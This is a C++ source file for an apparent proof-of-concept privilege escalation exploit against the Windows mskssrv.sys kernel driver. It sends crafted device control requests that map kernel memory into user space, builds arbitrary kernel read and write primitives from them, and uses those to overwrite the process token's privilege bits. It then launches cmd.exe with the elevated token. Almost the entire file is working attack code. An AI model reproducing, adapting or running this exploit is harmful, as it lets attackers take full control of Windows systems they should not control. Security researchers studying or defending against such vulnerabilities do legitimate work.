#include "poc.h"

#include <psapi.h>

#include <cstddef>
#include <cstdint>

#include "common/structs.h"
#include "common/utils.h"

poc::Bug poc_;

uint64_t ReadPrimitive(uint64_t where) {
    // Initialize Stream
    bool status = false;
    if (poc::once) {
        poc_.InitializeStream();
    }

    // PublishTx
    status = poc_.PublishTx(where);

    // Register Stream
    if (poc::once) {
        poc_.RegisterStream();
        poc::once = false;
    }

    // ConsumeTx
    poc_.ConsumeTx();

    // DrainTx
    poc_.DrainTx();

    return *reinterpret_cast<uint64_t*>(poc_.GetMappedAddr());
}

void WritePrimitive(uint64_t What, uint64_t Where) {
    // PublishTx
    poc_.PublishTx(Where);

    // ConsumeTx
    poc_.ConsumeTx();

    // DrainTx
    poc_.DrainTx();

    *reinterpret_cast<uint64_t*>(poc_.GetMappedAddr()) = What;
    std::cout << "[+] Value written" << std::endl;
}

namespace poc {

bool Driver::ConnectToMskSSRVPort() {
    hDevice = CreateFileW(lpFileName, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL, nullptr);

    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cout << "[-] Error connecting to mskssrv driver with error: 0x" << std::hex << hDevice
                  << GetLastError() << std::endl;
        return false;
    }
    return true;
}

bool Bug::DrainTx() {
    std::cout << "[+] Draining Tx data" << std::endl;
    auto* pFSFrameInfo = static_cast<FSFrameInfo*>(malloc(sizeof(FSFrameInfo)));
    memset(pFSFrameInfo, 0x00, sizeof(FSFrameInfo));

    pFSFrameInfo->ArrayCounter = 1;
    pFSFrameInfo->q1 = 1;
    pFSFrameInfo->q2 = 1;
    pFSFrameInfo->q3 = 1;
    pFSFrameInfo->q4 = 1;
    pFSFrameInfo->h1 = 1;
    pFSFrameInfo->FSMemoryStreamArray.VirtualAddressLength1 = 0x100;
    pFSFrameInfo->FSMemoryStreamArray.VirtualAddressLength2 = 0x1000;
    pFSFrameInfo->FSMemoryStreamArray.switch_case = 1;

    return driver1_.SendDataToDriver(0x2f0424, pFSFrameInfo, sizeof(FSFrameInfo), pFSFrameInfo,
                                     sizeof(FSFrameInfo));
}

bool Bug::InitializeGlobalRendezvous() {
    std::cout << "[+] Initializing the global Rendezvous" << std::endl;
    auto* stream_data = static_cast<_FSStreamRegInfo*>(malloc(sizeof(_FSStreamRegInfo)));
    memset(stream_data, 0x0, sizeof(_FSStreamRegInfo));
    HANDLE hEvent = CreateEvent(nullptr, NULL, NULL, nullptr);
    stream_data->ObjectHandle = hEvent;
    stream_data->q2 = GetCurrentProcessId();
    stream_data->q1 = 0x5;
    stream_data->f2 = 0x50;
    stream_data->q5 = 0x20000;
    stream_data->q3 = 1;

    return driver1_.SendDataToDriver(0x2f0400, stream_data, sizeof(_FSStreamRegInfo));
}

bool Bug::InitializeStream() {
    std::cout << "[+] Initializing the data stream" << std::endl;
    auto* stream_data = static_cast<_FSStreamRegInfo*>(malloc(sizeof(_FSStreamRegInfo)));
    memset(stream_data, 0x0, sizeof(_FSStreamRegInfo));
    HANDLE hEvent = CreateEvent(nullptr, NULL, NULL, nullptr);
    stream_data->ObjectHandle = hEvent;
    stream_data->q2 = GetCurrentProcessId();
    stream_data->q1 = 0x5;
    stream_data->f2 = 0x50;
    stream_data->q5 = 0x20000;
    stream_data->q3 = 1;

    return driver1_.SendDataToDriver(0x2f0404, stream_data, sizeof(_FSStreamRegInfo));
}

bool Bug::PublishTx(uint64_t addr) {
    std::cout << "[+] Publishing Tx data" << std::endl;
    auto* pFSFrameInfo = static_cast<FSFrameInfo*>(malloc(sizeof(FSFrameInfo)));
    memset(pFSFrameInfo, 0x00, sizeof(FSFrameInfo));

    pFSFrameInfo->ArrayCounter = 1;
    pFSFrameInfo->q1 = 1;
    pFSFrameInfo->q2 = 1;
    pFSFrameInfo->q3 = 1;
    pFSFrameInfo->q4 = 1;
    pFSFrameInfo->h1 = 1;
    pFSFrameInfo->FSMemoryStreamArray.VirtualAddress1 = (PVOID)addr;
    pFSFrameInfo->FSMemoryStreamArray.VirtualAddress2 = (PVOID)addr;
    pFSFrameInfo->FSMemoryStreamArray.VirtualAddressLength1 = 0x100;
    pFSFrameInfo->FSMemoryStreamArray.VirtualAddressLength2 = 0x100;
    pFSFrameInfo->FSMemoryStreamArray.switch_case =
        0xffffffff00000008;  // This is needed for RW for mapped pages

    return driver1_.SendDataToDriver(0x2f0408, pFSFrameInfo, sizeof(FSFrameInfo));
}

bool Bug::RegisterStream() {
    std::cout << "[+] Registering the stream" << std::endl;
    auto* stream_data = static_cast<_FSStreamRegInfo*>(malloc(sizeof(_FSStreamRegInfo)));
    memset(stream_data, 0x00, sizeof(_FSStreamRegInfo));
    HANDLE hEvent = CreateEvent(nullptr, NULL, NULL, nullptr);
    stream_data->ObjectHandle = hEvent;
    stream_data->q2 = GetCurrentProcessId();
    stream_data->q1 = 0x3;
    stream_data->f2 = 0x50;
    stream_data->q5 = 0x20000;
    stream_data->q3 = 1;

    return driver2_.SendDataToDriver(0x2F0420, stream_data, sizeof(_FSStreamRegInfo));
}

bool Bug::ConsumeTx() {
    std::cout << "[+] Consuming Tx data" << std::endl;
    auto* pFSFrameInfo = static_cast<FSFrameInfo*>(malloc(sizeof(FSFrameInfo)));
    memset(pFSFrameInfo, 0x00, sizeof(FSFrameInfo));

    pFSFrameInfo->ArrayCounter = 1;
    pFSFrameInfo->q1 = 1;
    pFSFrameInfo->q2 = 1;
    pFSFrameInfo->q3 = 1;
    pFSFrameInfo->q4 = 1;
    pFSFrameInfo->h1 = 1;
    pFSFrameInfo->FSMemoryStreamArray.VirtualAddressLength1 = 0x100;
    pFSFrameInfo->FSMemoryStreamArray.VirtualAddressLength2 = 0x1000;
    pFSFrameInfo->FSMemoryStreamArray.switch_case = 1;

    size_t out_buffer_len = 0xb0;
    PVOID outBuffer = malloc(out_buffer_len);
    memset(outBuffer, 0x00, out_buffer_len);

    driver1_.SendDataToDriver(0x2f0410, pFSFrameInfo, sizeof(FSFrameInfo), outBuffer,
                              out_buffer_len);

    user_mapped_addr_ = *reinterpret_cast<uint64_t*>(static_cast<PUCHAR>(outBuffer) + 0x28 + 0x20);

    std::cout << "\t[+] Kernel pages mapped at 0x" << std::hex << user_mapped_addr_ << std::endl;
    return true;
}

bool Bug::Start() {
    // Elevate Privs
    ElevatePriv();

    return true;
}

bool Driver::SendDataToDriver(int ioctl_code,
                              PVOID buffer,
                              size_t buffer_len,
                              PVOID OutBuffer,
                              size_t out_buffer_len) {
    NTSTATUS status = -1;
    status = DeviceIoControl(hDevice, ioctl_code, buffer, buffer_len, OutBuffer, out_buffer_len,
                             nullptr, nullptr);
    if (status != 0) {
        return true;
    }

    std::cout << "[-] Error sending data to driver successfully. ErrorCode: " << GetLastError()
              << std::endl;
    return false;
}

void ElevatePriv() {
    int pid = GetCurrentProcessId();
    std::cout << "[+] Created a new cmd.exe with pid: " << pid << std::endl;
    Sleep(1000);

    HANDLE currentToken = nullptr;
    BOOL status = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentToken);
    if (status == 0) {
        std::cout << "[-] Error getting process token handle" << std::endl;
        return;
    }
    std::cout << "[+] Token Handle: " << currentToken << std::endl;

    // Iterate through all handleInfo and find the one associated with the target process
    uint64_t token_addr = 0;
    token_addr = utils_.GetHandleAddress(pid, (USHORT)currentToken);

    std::cout << "[+] Token address for spawned pid: 0x" << std::hex << token_addr << std::endl;

    // These are kernel values for _TOKEN+0x40 which we copy on our _TOKEN fields.
    // +0x40 : 0000001f`f2ffffbc
    // +0x48 : 0000001e`60b1e890
    // +0x50 : 0000001e`60b1e890

    uint64_t token_privs = (token_addr & 0xfffffffffffffff0) + 0x40;
    std::cout << "[+] Token address with privielges info: 0x" << std::hex << token_privs
              << std::endl;
    ReadPrimitive(token_privs);
    WritePrimitive(0x1ff2ffffbc, token_privs);
    WritePrimitive(0x1ff2ffffbc, token_addr + 8);
    WritePrimitive(0x1ff2ffffbc, token_addr + 16);

    // We need to create a process after modifying the _TOKEN in order to use it for child
    // process
    utils_.CreateProcessWrapper(L"C:\\Windows\\System32\\cmd.exe");
}

bool Bug::InitializeDriverHandles() {
    kBaseAddr = utils_.GetKernelBaseAddress();

    return driver1_.ConnectToMskSSRVPort() && driver2_.ConnectToMskSSRVPort() &&
           InitializeGlobalRendezvous();
}

}  // namespace poc

int main() {
    std::cout << "[+] Initializing 2 driver handles" << std::endl;
    poc_.InitializeDriverHandles();
    std::cout << "[+] Connected to mskssrv.sys driver" << std::endl;

    if (poc_.Start()) {
        std::cout << "[+] Exploit completed successfully" << std::endl;
        return 0;
    }

    std::cout << "[!] Exploit execution failed" << std::endl;
    return -1;
}
